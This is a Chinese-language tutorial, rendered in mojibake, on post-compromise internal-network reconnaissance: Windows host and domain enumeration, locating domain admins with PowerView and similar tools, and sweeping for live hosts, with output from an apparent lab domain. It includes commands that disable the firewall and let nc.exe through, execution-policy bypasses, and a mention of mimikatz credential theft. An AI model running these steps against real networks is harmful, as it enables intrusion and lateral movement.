# å†…ç½‘ä¿¡æ¯æ”¶é›†

# ä¿¡æ¯æ”¶é›†

## ä¸€ã€å†…ç½‘ä¿¡æ¯æ”¶é›†æ¦‚è¿°

1.1ã€æˆ‘æ˜¯è°ï¼Ÿ

â€”â€”å¯¹å½“å‰æœºå™¨è§’è‰²çš„åˆ¤æ–­

WEBæœåŠ¡å™¨ï¼Ÿå¼€å‘æµ‹è¯•æœåŠ¡å™¨ï¼Ÿå…¬å…±æœåŠ¡å™¨ï¼Ÿæ–‡ä»¶æœåŠ¡å™¨ï¼Ÿä»£ç†æœåŠ¡å™¨ï¼ŸDNSæœåŠ¡å™¨ï¼Ÿç­‰ç­‰ï¼Ÿï¼Ÿ

æ ¹æ® ä¸»æœºåã€æ–‡ä»¶ã€ç½‘ç»œè¿æ¥æƒ…å†µç»¼åˆåˆ¤æ–­ã€‚

1.2ã€è¿™æ˜¯å“ªï¼Ÿ

â€”â€” å¯¹å½“å‰æœºå™¨æ‰€å¤„ç½‘ç»œç¯å¢ƒçš„æ‹“æ‰‘ç»“æ„è¿›è¡Œåˆ†æä¸åˆ¤æ–­ã€‚

ç»˜åˆ¶å¤§è‡´å†…ç½‘æ‹“æ‰‘å›¾

1.3ã€æˆ‘åœ¨å“ª

â€”â€”- å¯¹å½“å‰æœºå™¨æ‰€å¤„åŒºåŸŸçš„åˆ¤æ–­ã€‚

DMZåŒºã€åŠå…¬åŒºã€æ ¸å¿ƒåŒº

## äºŒã€æ”¶é›†æœ¬æœºä¿¡æ¯

2.1æ‰‹åŠ¨ä¿¡æ¯æ”¶é›†

### 2.1.1æŸ¥è¯¢ç½‘ç»œé…ç½®ä¿¡æ¯

```php
ipconfig/all
```

### 2.1.2æŸ¥è¯¢æ“ä½œç³»ç»ŸåŠè½¯ä»¶ä¿¡æ¯

```php
systeminfo
å¯æŸ¥è¯¢å‡ºè¡¥ä¸ï¼Œå¯åˆ©ç”¨ç³»ç»Ÿè‡ªèº«å­˜åœ¨çš„æ¼æ´è¿›è¡Œåç»­çš„ææƒã€‚
systeminfo | findstr /B /C:â€œOS åç§°â€ /C:â€œOS ç‰ˆæœ¬â€
```

æŸ¥çœ‹ç³»ç»Ÿä½“ç³»ç»“æ„

```php
echo %PROCESSOR_ARCHITECTURE%
```

æŸ¥çœ‹å®‰è£…çš„è½¯ä»¶ç‰ˆæœ¬åŠè·¯å¾„ç­‰

```php
wmic product get name,version
```

åˆ©ç”¨powershellæ”¶é›†è½¯ä»¶ç‰ˆæœ¬ä¿¡æ¯

```php
powershell â€œGET-WmiObject -class Win32_Product | Select-Object -Property name,versionâ€
```

### 2.1.3æŸ¥è¯¢æœ¬æœºæœåŠ¡ä¿¡æ¯

```php
wmic service list brief
```

### 2.1.4æŸ¥è¯¢è¿›ç¨‹åˆ—è¡¨

```php
tasklist
```

æŸ¥çœ‹å½“å‰è¿›ç¨‹å’Œè¿›ç¨‹ç”¨æˆ·

```
wmic process list brief
```

### 2.1.5æŸ¥çœ‹å¯åŠ¨ç¨‹åºï¼ˆå¯åŠ¨é¡¹ï¼‰ä¿¡æ¯

```php
wmic startup get command,caption
```

### 2.1.6æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡

```php
schtasks /query /fo LIST /v
```

### 2.1.7æŸ¥çœ‹ç”¨æˆ·åˆ—è¡¨

æŸ¥çœ‹æœ¬æœºç”¨æˆ·åˆ—è¡¨

```php
net user
```

è·å–æœ¬åœ°ç®¡ç†å‘˜ç»„

```php
net localgroup administrators
```

æŸ¥çœ‹å½“å‰åœ¨çº¿ç”¨æˆ·ï¼š

```php
query user || qwinsta
```

### 2.1.8æŸ¥çœ‹ä¸»æœºå¼€æœºæ—¶é—´

```php
net statistics workstation
```

### 2.1.9åˆ—å‡ºæˆ–ç«¯å¼€æœ¬åœ°è®¡ç®—æœºä¸æ‰€æœ‰è¿æ¥çš„å®¢æˆ·ç«¯ä¹‹é—´çš„ä¼šè¯

```
net session
```

### 2.1.10 æŸ¥è¯¢ç«¯å£åˆ—è¡¨

```php
netstat -ano
```

### 2.1.11 æŸ¥çœ‹è¡¥ä¸åˆ—è¡¨

```php
systeminfo
wmic qfe get Caption,Descript,HotFixID,InstalledOn
```

### 2.1.12æŸ¥è¯¢æœ¬åœ°å…±äº«åˆ—è¡¨

```php
net share
wmic share get name,path,status
```

### 2.1.13æŸ¥è¯¢è·¯ç”±è¡¨åŠæ‰€æœ‰å¯ç”¨æ¥å£çš„ARPç¼“å­˜è¡¨

```php
route print
arp -a
```

### 2.1.14æŸ¥çœ‹é˜²ç«å¢™ç›¸å…³é…ç½®

æŸ¥æ€è½¯

```php
WMIC /Node:localhost /Namespace:\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
```

å…³é—­é˜²ç«å¢™

```php
netsh firewall set opmode disable (Windows Server 2003 ç³»ç»ŸåŠä¹‹å‰ç‰ˆæœ¬)
netsh advfirewall set allprofiles state off (Windows Server 2003 ç³»ç»ŸåŠä¹‹åç‰ˆæœ¬)
```

æŸ¥çœ‹é˜²ç«å¢™é…ç½®

```php
netstat firewall show config
```

ä¿®æ”¹é˜²ç«å¢™é…ç½®

```php
win server 2003 åŠä¹‹å‰ï¼Œå…è®¸æŒ‡å®šç¨‹åºå…¨éƒ¨è¿æ¥ã€‚

netsh firewall add allowedprogram c:\nc.exe â€œallwa ncâ€ enable

win server 2003 ä¹‹å
netsh advfirewall firewall add rule name=â€œpass ncâ€ dir=in action=allow program=â€œc:\nc.exeâ€

å…è®¸æŒ‡å®šç¨‹åºé€€å‡º
netsh advfirewall firewall add rule name=â€œAllow ncâ€ dir=out action=allow program=â€œc:\nc.exeâ€

å…è®¸ 3389 ç«¯å£æ”¾è¡Œ
netsh advfirewall firewall add rule name=â€œRemote Desktopâ€ protocol=TCP dir=in localport=3389 action=allow

è‡ªå®šä¹‰ç¿»è¿‡å¢™å­˜å‚¨ä½ç½®
netsh advfirewall set currentprofile logging filename â€œc:\windows\temp\fw.logâ€

è¿œç¨‹æ¡Œé¢è¿æ¥å†å²è®°å½•

cmdkey /l
```

è‡ªå®šä¹‰é˜²ç«å¢™æ—¥å¿—çš„å‚¨å­˜ä½ç½®

```php
netsh advfirewall set currentprofile logging filename "C:\windows\temp\fw.log"
```

### 2.2è‡ªåŠ¨æ”¶é›†ä¿¡æ¯

[http://www.fuzzysecurity.com/scripts/files/wmic_info.rar](http://www.fuzzysecurity.com/scripts/files/wmic_info.rar)

ä¸‹è½½åç›´æ¥è¿è¡Œè„šæœ¬ï¼š
`wmic_info.bat`

## ä¸‰ã€æŸ¥çœ‹å½“å‰æƒé™

### 3.1æƒé™

- æœ¬åœ°æ™®é€šç”¨æˆ·
- æœ¬åœ°ç®¡ç†å‘˜ç”¨æˆ·
- æœ¬åœ°åŸŸå†…ç”¨æˆ·

### 3.2è·å–åŸŸSID

```php
whoami /all
```

### 3.3æŸ¥è¯¢æŒ‡å®šç”¨æˆ·è¯¦ç»†ä¿¡æ¯

```php
net user win7 /domain
```

## å››ã€åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ

äº†è§£æœ¬æœºä¿¡æ¯åï¼Œæ¥ä¸‹æ¥å°±è¦åˆ¤æ–­å½“å‰æ‰€åœ¨å†…ç½‘æ˜¯å¦å­˜åœ¨åŸŸã€‚

### 4.1 ipconfig

æŸ¥çœ‹ç½‘å…³IPåœ°å€ã€DNSçš„ipåœ°å€ã€åŸŸåã€æœ¬æœºæ˜¯å¦å’ŒDNSæœåŠ¡å™¨å¤„äºåŒä¸€ç½‘æ®µç­‰ä¿¡æ¯ã€‚

```
ipconfig /all
```

ç„¶å`nslookup`è§£æåŸŸåçš„ipåœ°å€ï¼ŒæŸ¥çœ‹æ˜¯å¦ä¸DNSæœåŠ¡å™¨åœ¨åŒä¸€ipä¸Šã€‚

```
nslookup security.com
```

### 4.2 æŸ¥çœ‹ç³»ç»Ÿè¯¦ç»†ä¿¡æ¯

```
systeminfo
```

ä»ä¸­çœ‹åˆ°å¤„äºåŸŸ `security.com`

### 4.3 æŸ¥çœ‹å½“å‰ç™»å½•åŸŸåŠåŸŸç”¨æˆ·

```
net config workstation
```

### 4.4 åˆ¤æ–­ä¸»åŸŸ

```
net time /domain
```

## äº”ã€æœé›†åŸŸå†…åŸºæœ¬ä¿¡æ¯

### 5.1 æŸ¥è¯¢åŸŸ

```
net view /domain
```

### 5.2 æŸ¥è¯¢åŸŸå†…æ‰€æœ‰è®¡ç®—æœº

```
net view /domain:SECURITY
```

### 5.3 æŸ¥è¯¢åŸŸå†…æ‰€æœ‰ç”¨æˆ·ç»„åˆ—è¡¨

```
net group /domain
```

- Domain Admins : åŸŸç®¡ç†å‘˜ç»„
- Domain Computers : åŸŸå†…æœºå™¨
- Domain Controllers ï¼šåŸŸæ§åˆ¶å™¨
- Domain Guest ï¼š åŸŸè®¿å®¢ï¼Œæƒé™è¾ƒä½
- Domain User ï¼š åŸŸç”¨æˆ·
- Enterprise Admins ï¼š ä¼ä¸šç³»ç»Ÿç®¡ç†å‘˜ç”¨æˆ·

é»˜è®¤ï¼ŒDomain Admins ã€Enterprise Admins å¯¹åŸŸå†…æœºå™¨æœ‰å®Œå…¨æ§åˆ¶æƒã€‚

### 5.4 æŸ¥è¯¢æ‰€æœ‰åŸŸæˆå‘˜è®¡ç®—æœºåˆ—è¡¨

```php
net group â€œdomain computersâ€ /doamin
```

### 5.5 è·å–åŸŸç”¨æˆ·å¯†ç ä¿¡æ¯

```php
net accounts /domain
```

### 5.6 è·å–åŸŸä¿¡ä»»ä¿¡æ¯

```php
nltest /domain_trusts
```

## å…­ã€æŸ¥çœ‹åŸŸæ§åˆ¶å™¨

### 6.1æŸ¥çœ‹åŸŸæ§åˆ¶å™¨çš„æœºå™¨å

```
nltest /DCLIST:security
```

### 6.2æŸ¥çœ‹åŸŸæ§åˆ¶å™¨çš„ä¸»æœºå

```
nslookup -type=SRV_ldap_tcp
```

### 6.3æŸ¥çœ‹å½“å‰æ—¶é—´

```
net time /domain
```

### 6.4æŸ¥çœ‹åŸŸæ§åˆ¶å™¨ç»„

```
net group â€œdomain controllersâ€ /domain
```

## ä¸ƒã€è·å–åŸŸå†…ç”¨æˆ·å’Œç®¡ç†å‘˜ä¿¡æ¯

### 7.1æŸ¥è¯¢æ‰€æœ‰åŸŸç”¨æˆ·åˆ—è¡¨

```
net user /domain
```

### 7.2è·å–åŸŸå†…ç”¨æˆ·è¯¦ç»†ä¿¡æ¯

```
wmic useraccount get /all
```

### 7.3æŸ¥çœ‹å­˜åœ¨çš„ç”¨æˆ·

```php
dsquery user

dsquery computer - æŸ¥æ‰¾ç›®å½•ä¸­çš„è®¡ç®—æœºã€‚
dsquery contact - æŸ¥æ‰¾ç›®å½•ä¸­çš„è”ç³»äººã€‚
dsquery subnet - æŸ¥æ‰¾ç›®å½•ä¸­çš„å­ç½‘ã€‚
dsquery group - æŸ¥æ‰¾ç›®å½•ä¸­çš„ç»„ã€‚
dsquery ou - æŸ¥æ‰¾ç›®å½•ä¸­çš„ç»„ç»‡å•ä½ã€‚
dsquery site - æŸ¥æ‰¾ç›®å½•ä¸­çš„ç«™ç‚¹ã€‚
dsquery server - æŸ¥æ‰¾ç›®å½•ä¸­çš„åŸŸæ§åˆ¶å™¨ã€‚
dsquery user - æŸ¥æ‰¾ç›®å½•ä¸­çš„ç”¨æˆ·ã€‚
dsquery quota - æŸ¥æ‰¾ç›®å½•ä¸­çš„é…é¢ã€‚
dsquery partition - æŸ¥æ‰¾ç›®å½•ä¸­çš„åˆ†åŒºã€‚
dsquery * - ç”¨é€šç”¨çš„ LDAP æŸ¥è¯¢æŸ¥æ‰¾ç›®å½•ä¸­çš„ä»»ä½•å¯¹è±¡ã€‚
dsquery computer domainroot -limit 65535 && net group â€œdomain computersâ€ /domain  //åˆ—å‡ºè¯¥åŸŸå†…æ‰€æœ‰æœºå™¨å
dsquery user domainroot -limit 65535 && net user /domain //åˆ—å‡ºè¯¥åŸŸå†…æ‰€æœ‰ç”¨æˆ·å
dsquery subnet //åˆ—å‡ºè¯¥åŸŸå†…ç½‘æ®µåˆ’åˆ†
dsquery group && net group /domain //åˆ—å‡ºè¯¥åŸŸå†…åˆ†ç»„
dsquery ou //åˆ—å‡ºè¯¥åŸŸå†…ç»„ç»‡å•ä½
dsquery server && net time /domain //åˆ—å‡ºè¯¥åŸŸå†…åŸŸæ§åˆ¶å™¨
```

### 7.4æŸ¥è¯¢æœ¬åœ°ç®¡ç†å‘˜ç»„ç”¨æˆ·

```
net localgroup administrators
```

## å…«ã€æŸ¥è¯¢åŸŸç®¡ç†å‘˜ç”¨æˆ·ç»„

### 8.1æŸ¥è¯¢åŸŸç®¡ç†å‘˜ç”¨æˆ·

```
net group â€œdomain adminsâ€ /domain
```

### 8.2æŸ¥è¯¢ç®¡ç†å‘˜ç”¨æˆ·ç»„

```
net group â€œenterprise adminsâ€ /domain
```

## ä¹ã€å®šä½åŸŸç®¡ç†å‘˜

### 9.1åŸŸç®¡ç†å‘˜å®šä½æ¦‚è¿°

å†…ç½‘ä¸­é€šå¸¸ä¼šæœ‰å¤§é‡ç½‘ç»œå®‰å…¨ç³»ç»Ÿå’Œè®¾å¤‡ï¼ŒIDS, IPS, æ—¥å¿—å®¡è®¡ï¼Œå®‰å…¨ç½‘å…³ï¼Œåç—…æ¯’è½¯ä»¶ç­‰ã€‚

åœ¨ä¸€ä¸ªåŸŸä¸­ï¼Œå½“è®¡ç®—æœºåŠ å…¥åŸŸä¹‹åï¼Œä¼šé»˜è®¤ç»™åŸŸç®¡ç†å‘˜ç»„èµ‹äºˆæœ¬åœ°ç³»ç»Ÿç®¡ç†å‘˜æƒé™ã€‚å› æ­¤ï¼ŒåŸŸç®¡ç†å‘˜ç»„çš„æˆå‘˜å‡å¯è®¿é—®æœ¬åœ°è®¡ç®—æœºï¼Œä¸”å…·æœ‰å®Œå…¨æ§åˆ¶æƒé™ã€‚

å®šä½åŸŸç®¡ç†å‘˜æ¸ é“ï¼š

- æ—¥å¿—ï¼šæœ¬åœ°æœºå™¨ç®¡ç†å‘˜æ—¥å¿—ï¼Œä½¿ç”¨è„šæœ¬æˆ–è€…Wevtuilå·¥å…·å¯¼å‡ºæŸ¥çœ‹ã€‚
- ä¼šè¯ï¼ŒåŸŸå†…æ¯å°æœºå™¨çš„ç™»å½•ä¼šè¯ï¼Œnetsess.exe, powerview ç­‰å·¥å…·æŸ¥è¯¢ã€‚

### 9.2å¸¸ç”¨åŸŸç®¡ç†å‘˜å®šä½æƒé™

### 9.2.1 psloggedon.exe

`net session` å¯æŸ¥çœ‹è°ä½¿ç”¨äº†æœ¬æœºèµ„æºï¼Œä½†ä¸èƒ½æŸ¥çœ‹è°åœ¨ä½¿ç”¨è¿œç¨‹è®¡ç®—æœºèµ„æºã€è°ç™»å½•äº†æœ¬åœ°æˆ–è¿œç¨‹è®¡ç®—æœº

[ä¸‹è½½é“¾æ¥](https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon)

ä½¿ç”¨ï¼š

```php
C:\Users\de1ay.DE1AY\Desktop>PsLoggedon.exe \\DC

PsLoggedon v1.35 - See who's logged on
Copyright (C) 2000-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

No one is logged on locally.

Users logged on via resource shares:
     2023/2/28 16:06:09         WEB\Administrator
     2023/2/28 16:06:25         DE1AY\de1ay
```

### 9.2.2 PVEFindADUser.exe

ç”¨äºæŸ¥æ‰¾æ´»åŠ¨ç›®å½•ç”¨æˆ·ç™»å½•çš„ä½ç½®ã€æšä¸¾åŸŸç”¨æˆ·ï¼Œä»¥åŠæŸ¥æ‰¾åœ¨ç‰¹å®šè®¡ç®—æœºä¸Šç™»å½•çš„ç”¨æˆ·ï¼ŒåŒ…æ‹¬æœ¬åœ°ç”¨æˆ·ã€é€šè¿‡RDPç™»å½•ç”¨æˆ·ã€ç”¨äºè¿è¡ŒæœåŠ¡å™¨å’Œè®¡åˆ’ä»»åŠ¡çš„ç”¨æˆ·ã€‚éœ€ç®¡ç†å‘˜æƒé™

ä¸‹è½½åœ°å€ï¼š[https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn](https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn)

ä½¿ç”¨:

```php
C:\Users\mssql\Desktop>PVEFindADUser.exe -current
 -----------------------------------------
  PVE Find AD Users
  Peter Van Eeckhoutte
  (c) 2009 - http://www.corelan.be:8800
  Version : 1.0.0.12
 -----------------------------------------
 [+] Finding currently logged on users ? true
 [+] Finding last logged on users ? false

 [+] Enumerating all computers...
 [+] Number of computers found : 3
 [+] Launching queries
     [+] Processing host : DC.de1ay.com (Windows Server 2012 R2 Standard)
     [+] Processing host : PC.de1ay.com (Windows 7 æ——èˆ°ç‰ˆ;Service Pack 1)
     [+] Processing host : WEB.de1ay.com (Windows Server 2008 R2 Standard;Servic
e Pack 1)
         [-] Computer : WEB.de1ay.com Down
 [+] Report written to report.csv
```

### 9.2.3 netview.exe

netview æ˜¯ä¸€ä¸ªæšä¸¾å·¥å…·ï¼Œä½¿ç”¨ WinAPI æšä¸¾ç³»ç»Ÿï¼Œåˆ©ç”¨ NetSessionEnum å¯»æ‰¾ç™»å½•ä¼šè¯ï¼Œåˆ©ç”¨ NetShareEnum å¯»æ‰¾å…±äº«ï¼Œåˆ©ç”¨ NetWkstaUserEnum æšä¸¾ç™»å½•çš„ç”¨æˆ·ï¼Œnetview å¯ä»¥æŸ¥è¯¢å…±äº«å…¥å£å’Œæœ‰ä»·å€¼çš„ç”¨æˆ·ï¼Œå…¶ç»å¤§éƒ¨åˆ†åŠŸèƒ½æ— éœ€ç®¡ç†å‘˜æƒé™å°±å¯ä½¿ç”¨ã€‚

[ä¸‹è½½é“¾æ¥](https://github.com/mubix/netview)

ä½¿ç”¨ï¼šnetview.exe -d DE1AY(åŸŸå)

```php
C:\Users\de1ay.DE1AY\Desktop>netview.exe -d DE1AY
[+] Domain Specified: DE1AY

[*] Using interval: 0
[*] Using jitter: 0.00

[+] Number of hosts: 2

[+] Host: DC
Enumerating AD Info[+] DC - Comment -
[+] D - OS Version - 6.3
[+] DC - Domain Controller

Enumerating IP Info
[+] (null) - IPv4 Address - 10.10.10.10

Enumerating Share Info
[+] DC - Share : ADMIN$               : ????
[+] DC - Share : C$                   : ????
[+] DC - Share : IPC$                 : ?? IPC
[+] DC - Share : NETLOGON             : Logon server share
[+] DC - Share : SYSVOL               : Logon server share

Enumerating Session Info
[+] DC - Session - Administrator from \\10.10.10.80 - Active: 26035 - Idle: 6898

[+] DC - Session - de1ay from \\10.10.10.80 - Active: 0 - Idle: 0

Enumerating Logged-on Users
[+] DC - Logged-on - DE1AY.COM\de1ay

[+] Host: PC
Enumerating AD Info[+] PC - Comment -
[+] P - OS Version - 6.1

Enumerating IP Info
[+] (null) - IPv4 Address - 10.10.10.201

Enumerating Share Info
[+] PC - Share : ADMIN$               : ????
[+] PC - Share : C$                   : ????
[+] PC - Share : IPC$                 : ?? IPC

Enumerating Session Info
[+] PC - Session - de1ay from \\10.10.10.80 - Active: 0 - Idle: 0

Enumerating Logged-on Users
```

### 9.2.4 Nmapçš„NSEè„šæœ¬

zenmap

[ä¸‹è½½é“¾æ¥](https://nmap.org/nsedoc/scripts/smb-enum-sessions.html)

ä½¿ç”¨:

```php
nmap --script=smb-os-discovery.nse -p 445 192.168.7.107
```

### 9.2.5 powerviewè„šæœ¬

[ä¸‹è½½é“¾æ¥](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView)

ä½¿ç”¨ï¼š

```php
powershell.exe -exec bypass -Command "& {Import-Module .\PowerView.ps1;Invoke-UserHunter}"
```

```php
C:\Users\de1ay.DE1AY\Desktop\PowerSploit-3.0.0\Recon>powershell.exe -exec bypass
 -Command "& {Import-Module .\PowerView.ps1;Invoke-UserHunter}"

UserDomain   : de1ay.com
UserName     : Administrator
ComputerName : DC.de1ay.com
IP           : 10.10.10.10
SessionFrom  : 10.10.10.80
LocalAdmin   :

UserDomain   : DE1AY
UserName     : Administrator
ComputerName : WEB.de1ay.com
IP           : {10.10.10.80, 192.168.5.131}
SessionFrom  :
LocalAdmin   :

UserDomain   : DE1AY
UserName     : Administrator
ComputerName : WEB.de1ay.com
IP           : {10.10.10.80, 192.168.5.131}
SessionFrom  :
LocalAdmin   :

UserDomain   : DE1AY
UserName     : Administrator
ComputerName : WEB.de1ay.com
IP           : {10.10.10.80, 192.168.5.131}
SessionFrom  :
LocalAdmin   :

UserDomain   : WEB
UserName     : Administrator
ComputerName : WEB.de1ay.com
IP           : {10.10.10.80, 192.168.5.131}
SessionFrom  :
LocalAdmin   :

UserDomain   : DE1AY
UserName     : Administrator
ComputerName : WEB.de1ay.com
IP           : {10.10.10.80, 192.168.5.131}
SessionFrom  :
LocalAdmin   :

UserDomain   : DE1AY
UserName     : Administrator
ComputerName : WEB.de1ay.com
IP           : {10.10.10.80, 192.168.5.131}
SessionFrom  :
LocalAdmin   :
```

### 9.2.6 Empire çš„ user_hunter æ¨¡å—

## åã€æŸ¥æ‰¾ä¸ç®¡ç†è¿›ç¨‹

å…¸å‹åŸŸææƒï¼š æ˜æ–‡å‡­æ®æˆ–é€šè¿‡ mimikatz ï¼ˆkali è‡ªå¸¦å·¥å…·ï¼Œå¯†ç æŠ“å–ç¥å™¨ï¼‰ææƒã€‚

### 10.1æœ¬æœºæ£€æŸ¥

è·å–åŸŸç®¡ç†å‘˜åˆ—è¡¨

```
net group â€œdomain adminsâ€ /domain
```

åˆ—å‡ºæœ¬æœºæ‰€æœ‰è¿›ç¨‹åŠè¿›ç¨‹ç”¨æˆ·

```
tasklist /v
```

å¯»æ‰¾åŸŸæ§åˆ¶å™¨çš„åŸŸç”¨æˆ·ä¼šè¯

åŸç†ï¼šåœ¨åŸŸæ§åˆ¶å™¨ä¸­æŸ¥è¯¢åŸŸä¼šè¯åˆ—è¡¨ï¼Œå¹¶å°†å…¶ä¸åŸŸç®¡ç†å‘˜åˆ—è¡¨äº¤å‰å¼•ç”¨ï¼Œä»è€Œå¾—åˆ°ä¸ç®¡ç†ä¼šè¯çš„ç³»ç»Ÿåˆ—è¡¨ã€‚

`NetSess -h`(netsess.exeé¡»ä¸Šè½½åˆ°ç›®æ ‡æœºå™¨ä¸­)

## åä¸€ã€æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº

### 11.1 åˆ©ç”¨NetBIOS å¿«é€Ÿæ¢æµ‹å†…ç½‘[nbtscanä¸‹è½½é“¾æ¥](https://github.com/search?q=nbtscan)

å‘½ä»¤ï¼š

```
nbtscan.exe -h

nbtscan.exe 10.1.1.1/24
```

### 11.2 åˆ©ç”¨ICMPåè®®å¿«é€Ÿæ¢æµ‹å†…ç½‘

```
for /L %i in (1,1,254) DO @ping -w 1 -n 1 10.1.1.%i | findstr â€œTTL=â€
```

### 11.3 é€šè¿‡ Arpåè®®æ¢æµ‹

```
arp.exe -t 10.1.1.1/24

Empireã€Nishang

arp -a
```

### 11.5.1 telnet

```php
telnet DC 22
```

### 11.5.2 MSF

```
search scanner/portscan/tcp
use 0
show options
set port 1-1000
set rhosts 192.168.1.1
set threads 10
run
```

# åŸŸå†…ä¸»æœºå­˜æ´»æ£€æµ‹

## ä¸€ã€ping

å¦‚æœæœåŠ¡å™¨ç¦pingï¼Œè¯¥æ–¹æ³•ä¸å¯ç”¨

### windows

```php
for /l %i in (1,1,255) do @ping 192.168.7.%i -w 1 -n 1|find /i "ttl="
```

```php
C:\Users\daniel10>for /l %i in (1,1,255) do @ping 192.168.7.%i -w 1 -n 1|find /i "ttl="
æ¥è‡ª 192.168.7.7 çš„å›å¤: å­—èŠ‚=32 æ—¶é—´<1ms TTL=128
æ¥è‡ª 192.168.7.107 çš„å›å¤: å­—èŠ‚=32 æ—¶é—´=1ms TTL=64
æ¥è‡ª 192.168.7.110 çš„å›å¤: å­—èŠ‚=32 æ—¶é—´<1ms TTL=128
```

### linux

```php
for k in $( seq 1 255);do ping -c 1 192.168.7.$k|grep "ttl"|awk -F "[ :]+" '{print $4}'; done
```

VPSè„šæœ¬

```php
strSubNet = "192.168.7."  
Set objFSO= CreateObject("Scripting.FileSystemObject")  
Set objTS = objfso.CreateTextFile("C:\Result.txt")   
For i = 1 To 254  
strComputer = strSubNet & i  
blnResult = Ping(strComputer)  
If blnResult = True Then  
objTS.WriteLine strComputer & " is alived ! :) "  
End If  
Next   
objTS.Close  
WScript.Echo "All Ping Scan , All Done ! :) "    
Function Ping(strComputer)  
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2") 
Set colItems = objWMIService.ExecQuery("Select * From Win32_PingStatus Where Address='" & strComputer & "'") 
For Each objItem In colItems  
Select case objItem.StatusCode  
Case 0  
Ping = True  
Case Else  
Ping = False  
End select  
Exit For  
Next  
End Function
```

```php
strSubNet = â€œ10.10.10.â€

Set objFSO= CreateObject(â€œScripting.FileSystemObjectâ€)

Set objTS = objfso.CreateTextFile(â€œC:\Windows\Temp\Result.txtâ€)

For i = 1 To 254

strComputer = strSubNet & i

blnResult = Ping(strComputer)

If blnResult = True Then

objTS.WriteLine strComputer & " is alived ! ğŸ˜ƒ "

End If

Next

objTS.Close

WScript.Echo "All Ping Scan , All Done ! ğŸ˜ƒ "

Function Ping(strComputer)

Set objWMIService = GetObject(â€œwinmgmts:\.\root\cimv2â€)

Set colItems = objWMIService.ExecQuery(â€œSelect * From Win32_PingStatus Where Address=â€™â€ & strComputer & â€œâ€™â€)

For Each objItem In colItems

Select case objItem.StatusCode

Case 0

Ping = True

Case Else

Ping = False

End select

Exit For

Next

End Function
```

## äºŒã€PowerShell

### TSPingSweep

ä¸‹è½½åœ°å€ï¼š

[https://raw.githubusercontent.com/dwj7738/My-Powershell-Repository/master/Scripts/Invoke-TSPingSweep.ps1](https://raw.githubusercontent.com/dwj7738/My-Powershell-Repository/master/Scripts/Invoke-TSPingSweep.ps1)

ä½¿ç”¨ï¼š

```php
powershell.exe -exec bypass -Command "Import-Module ./Invoke-TSPingSweep.ps1; Invoke-TSPingSweep -StartAddress 10.10.10.1 -EndAddress 10.10.10.254 -ResolveHost -ScanPort -Port 445,135"
```

msf

```php
C:\Users\de1ay.DE1AY\Desktop>powershell.exe -exec bypass -Command "Import-Module ./Invoke-TSPingSweep.ps1; Invoke-TSPingSweep -StartAddress 10.10.10.1 -EndAddress 10.10.10.254 -ResolveHost -ScanPort -Port 445,135"
powershell.exe -exec bypass -Command "Import-Module ./Invoke-TSPingSweep.ps1; Invoke-TSPingSweep -StartAddress 10.10.10.1 -EndAddress 10.10.10.254 -ResolveHost -ScanPort -Port 445,135"

IPAddress                  HostName                   Ports                    
---------                  --------                   -----                    
10.10.10.10                dc.de1ay.com               {445, 135}               
10.10.10.80                WEB.de1ay.com              {445, 135}               
10.10.10.201               PC.de1ay.com               {445, 135}
```

powershell

```php

```

### ARPScan

ä¸‹è½½åœ°å€ï¼š

[https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/Invoke-ARPScan.ps1](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/Invoke-ARPScan.ps1)

ä½¿ç”¨ï¼š

```php
powershell.exe -exec bypass -Command "Import-Module ./Invoke-ARPScan.ps1; Invoke-ARPScan -CIDR 10.10.10.0/24"
```

```php
C:\Users\de1ay.DE1AY\Desktop>powershell.exe -exec bypass -Command "Import-Module
 ./Invoke-ARPScan.ps1; Invoke-ARPScan -CIDR 10.10.10.0/24"

MAC                                     Address
---                                     -------
00:0C:29:4E:20:BD                       10.10.10.10
00:0C:29:68:D3:69                       10.10.10.80
00:0C:29:9E:7B:7A                       10.10.10.201
00:50:56:E5:AA:97                       10.10.10.254
00:0C:29:68:D3:69                       10.10.10.255
```

## ä¸‰ã€arp-scan

ä½¿ç”¨ARPåè®®è¿›è¡Œæ¢æµ‹

ä¸‹è½½åœ°å€ï¼š

[https://github.com/QbsuranAlang/arp-scan-windows-](https://github.com/QbsuranAlang/arp-scan-windows-)

ä½¿ç”¨ï¼š

```php
arp-scan.exe -t 10.10.10.0/24
```

```php
C:\Users\de1ay.DE1AY\Desktop>arp-scan.exe -t 10.10.10.0/24
Reply that 00:0C:29:4E:20:BD is 10.10.10.10 in 15.243100
Reply that 00:0C:29:68:D3:69 is 10.10.10.80 in 0.028800
Reply that 00:0C:29:9E:7B:7A is 10.10.10.201 in 14.66600
Reply that 00:50:56:E5:AA:97 is 10.10.10.254 in 14.76810
Reply that 00:0C:29:68:D3:69 is 10.10.10.255 in 0.024700
```

## å››ã€arp-ping

Arp-ping åŸºäº arp åè®®ï¼Œå®ƒå¯ä»¥pingå—é˜²ç«å¢™ä¿æŠ¤çš„ä¸»æœº

ä¸‹è½½åœ°å€ï¼š

[https://www.elifulkerson.com/projects/arp-ping.php](https://www.elifulkerson.com/projects/arp-ping.php)

ä½¿ç”¨ï¼š

å› ä¸ºarp-pingä¸€æ¬¡åªèƒ½pingä¸€ä¸ªä¸»æœºï¼Œå®æˆ˜ä¸­è‚¯å®šæ˜¯ä¸è¡Œçš„ï¼Œæ‰€ä»¥éœ€è¦å†™ä¸ªå¾ªç¯

```php
for /l %i in (1,1,255) do @arp-ping.exe 10.10.10.%i -w 1 -n 1|find /i "Reply"
```

```php
C:\Users\de1ay.DE1AY\Desktop>for /l %i in (1,1,255) do @arp-ping.exe 10.10.10.%i
 -w 1 -n 1|find /i "Reply"
Reply that 00:0C:29:4E:20:BD is 10.10.10.10 in 15.832ms
Reply that 00:0C:29:68:D3:69 is 10.10.10.80 in 0.046ms
Reply that 00:0C:29:9E:7B:7A is 10.10.10.201 in 6.804ms
